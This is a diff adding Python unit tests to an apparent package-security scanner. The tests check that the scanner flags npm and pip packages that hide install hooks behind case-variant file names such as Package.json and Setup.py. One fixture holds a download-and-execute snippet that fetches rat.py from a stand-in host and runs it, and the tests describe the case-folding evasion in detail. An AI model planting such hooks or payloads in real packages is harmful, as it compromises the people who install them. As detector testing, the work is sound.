@@ -189,6 +189,55 @@ class PathTests(unittest.TestCase):
                               if i["name"] == "Archive paths that differ only by case"]), 1)
         self.assertEqual(repo.case_fold("Lib/CAF\u00c9.JS"), repo.case_fold("lib/cafe\u0301.js"))
 
+    def test_a_case_twin_of_the_manifest_is_read_as_the_manifest(self):
+        # EG-4's leftover: on macOS and Windows, Package.json written after package.json is the package.json npm
+        # reads there: its install hook runs, and what its main names is an entry
+        raw = (tar_member("package/package.json", manifest(main="index.js"))
+               + tar_member("package/Package.json", manifest(main="lib/real.js", scripts={"postinstall": "node setup.js"}))
+               + tar_member("package/index.js", "module.exports = 1;\n")
+               + tar_member("package/lib/real.js", EXFIL_JS)
+               + tar_member("package/setup.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("Package.json", "CRITICAL")])
+        self.assertIn("lib/real.js", {i["file"] for i in issues(res, "SC-IMPORT-RISK")})
+        # (one written alone under another case is opened as package.json there too; nested ones are read as nested)
+        raw = (tar_member("package/PACKAGE.JSON", hooks(install="node setup.js"))
+               + tar_member("package/setup.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("PACKAGE.JSON", "CRITICAL")])
+
+    def test_a_path_node_opens_under_another_case(self):
+        # EG-4's leftover: on macOS and Windows `node Setup.js` runs setup.js, and require('./Lib/Core') loads
+        # lib/core.js (where the exact name is not there: on Linux they fail)
+        raw = (tar_member("package/package.json", manifest(main="index.js", scripts={"postinstall": "node Setup.js"}))
+               + tar_member("package/setup.js", EXFIL_JS)
+               + tar_member("package/index.js", "module.exports = require('./Lib/Core');\n")
+               + tar_member("package/lib/core.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("package.json", "CRITICAL")])
+        self.assertIn("Install hook runs Setup.js, which", issues(res, "SC-INSTALL-HOOK")[0]["msg"])
+        self.assertIn("lib/core.js", {i["file"] for i in issues(res, "SC-IMPORT-RISK")})
+
+    def test_a_case_variant_of_setup_py_or_pyproject_is_run_by_pip(self):
+        # EG-4's leftover: pip opens setup.py where case is ignored, and so Setup.py; and a pyproject.toml's backend
+        def sdist(*members):
+            return gzip.compress(b"".join(tar_member("x-1.0/" + n, d) for n, d in members) + b"\0" * 1024)
+        pkg_info = ("PKG-INFO", "Metadata-Version: 2.1\nName: x\nVersion: 1.0\n")
+        run = ("import requests, subprocess, sys\nr = requests.get('https://cdn.invalid/rat.py')\n"
+               "with open('rat.py', 'wb') as f:\n    f.write(r.content)\nsubprocess.check_call([sys.executable, 'rat.py'])\n")
+        res = scan_bytes(sdist(pkg_info, ("setup.py", "from setuptools import setup\nsetup()\n"), ("Setup.py", run)),
+                         artifact="sdist", eco="pypi")
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("Setup.py", "CRITICAL")])
+        self.assertIn("Setup.py runs when pip builds or installs this sdist", issues(res, "SC-INSTALL-HOOK")[0]["msg"])
+        backend = '[build-system]\nrequires = []\nbuild-backend = "hooks"\nbackend-path = ["_build"]\n'
+        res = scan_bytes(sdist(pkg_info, ("PyProject.toml", backend), ("_build/hooks.py", run)),
+                         artifact="sdist", eco="pypi")
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("_build/hooks.py", "CRITICAL")])
+
     def test_traversal_entry_is_flagged_not_scanned(self):
         raw = (tar_member("package/index.js", "1;\n") + tar_member("package/../evil.js", PAYLOAD)
                + b"\0" * 1024)
